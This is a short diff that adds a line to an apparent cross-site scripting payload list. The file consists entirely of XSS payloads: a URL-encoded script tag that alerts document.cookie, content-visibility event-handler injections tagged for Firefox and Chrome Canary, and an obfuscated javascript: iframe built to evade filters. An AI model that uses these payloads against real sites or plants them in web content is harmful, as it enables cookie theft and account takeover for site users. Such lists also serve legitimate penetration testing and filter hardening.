@@ -1,3 +1,4 @@
+ax6zt%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3Ey6uu6
 <p oncontentvisibilityautostatechange​="alert(/FirefoxOnly/)" style="content-visibility:auto">
 <input type="hidden" oncontentvisibilityautostatechange​="alert(/ChromeCanary/)" style="content-visibility:auto">
 <iFrAme/src=jaVascRipt​:alert(1)></iFramE>
